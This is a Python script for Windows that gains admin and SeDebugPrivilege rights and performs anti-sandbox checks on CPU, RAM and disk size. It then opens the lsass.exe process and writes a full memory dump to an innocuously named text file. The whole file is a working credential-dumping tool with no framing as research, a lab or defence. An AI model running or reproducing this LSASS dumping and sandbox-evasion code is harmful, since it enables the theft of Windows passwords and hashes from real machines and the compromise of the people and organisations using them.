import os
import psutil
import ctypes
from ctypes import wintypes
import win32security
import win32api
import win32con
import wmi
import time

def is_elevated():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        print(f"IsElevated: {is_admin}")
        return is_admin
    except:
        print("Admin check failed, assuming not an admin.")
        return False

def set_debug_privilege():
    try:
        priv_flags = win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
        hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), priv_flags)
        privilege_id = win32security.LookupPrivilegeValue(None, win32con.SE_DEBUG_NAME)
        old_privs = win32security.AdjustTokenPrivileges(hToken, False, [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)])
        print("SetDebugPrivilege: TRUE")
        return True
    except Exception as e:
        print(f"SetDebugPrivilege failed: {e}")
        return False

def check_system_info():
    cpu_count = os.cpu_count()
    print(f"CPU cores: {cpu_count}")
    if cpu_count < 2:
        print("CPU Check Failed :(")
        return False

    mem = psutil.virtual_memory()
    ram_mb = mem.total / (1024 * 1024)
    print(f"RAM: {ram_mb:.2f} MB")
    if ram_mb < 2000:
        print("RAM Check Failed :(")
        return False

    c = wmi.WMI()
    for disk in c.Win32_LogicalDisk(DriveType=3):
        disk_size_gb = int(disk.Size) / (1024**3)
        print(f"Disk size: {disk_size_gb:.2f} GB")
        if disk_size_gb < 10:
            print("HDD Check Failed :(")
            return False
    return True

def enum_lsass_handles():
    c = wmi.WMI()
    for process in c.Win32_Process():
        if process.Name == "lsass.exe":
            try:
                process_handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, process.ProcessId)
                print(f"Found lsass.exe with PID: {process.ProcessId}")
                return process_handle, process.ProcessId
            except Exception as e:
                print(f"Failed to open lsass.exe process: {e}")
                return None, None
    return None, None

def create_memory_dump(process_handle, pid):
    MiniDumpWithFullMemory = 2
    dump_file_path = f"Please_XOR.txt"

    CreateFile = ctypes.windll.kernel32.CreateFileW
    CreateFile.restype = wintypes.HANDLE
    CreateFile.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]

    dump_file_handle = CreateFile(
        dump_file_path,
        win32con.GENERIC_WRITE,
        0,
        None,
        win32con.CREATE_ALWAYS,
        win32con.FILE_ATTRIBUTE_NORMAL,
        None
    )
    
    if dump_file_handle == wintypes.HANDLE(-1).value:
        print(f"Failed to create dump file: {ctypes.GetLastError()}")
        return

    MiniDumpWriteDump = ctypes.windll.DbgHelp.MiniDumpWriteDump
    MiniDumpWriteDump.argtypes = [
        wintypes.HANDLE, wintypes.DWORD, wintypes.HANDLE, wintypes.INT,
        wintypes.LPVOID, wintypes.LPVOID, wintypes.LPVOID
    ]
    MiniDumpWriteDump.restype = wintypes.BOOL

    success = MiniDumpWriteDump(
        int(process_handle),  # Extract the handle value
        pid,
        dump_file_handle,
        MiniDumpWithFullMemory,
        None,
        None,
        None
    )

    if success:
        print(f"Memory dump created successfully at {dump_file_path}")
        # Ensure data is written and file is accessible
        ctypes.windll.kernel32.FlushFileBuffers(dump_file_handle)
        
        # Keep the file handle open indefinitely
        try:
            print("Keeping the dump file handle open...")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Closing the dump file handle.")
            ctypes.windll.kernel32.CloseHandle(dump_file_handle)
    else:
        print(f"Failed to create memory dump: {ctypes.GetLastError()}")
        ctypes.windll.kernel32.CloseHandle(dump_file_handle)

def main():
    if not is_elevated():
        print("Script is not running with elevated privileges. Please run as administrator.")
        return

    if not set_debug_privilege():
        print("Failed to set debug privileges.")
        return

    if not check_system_info():
        print("System does not meet the required specifications.")
        return

    hProcess, pid = enum_lsass_handles()
    if not hProcess:
        print("Failed to find or open lsass.exe process.")
        return

    create_memory_dump(hProcess, pid)

if __name__ == "__main__":
    main()
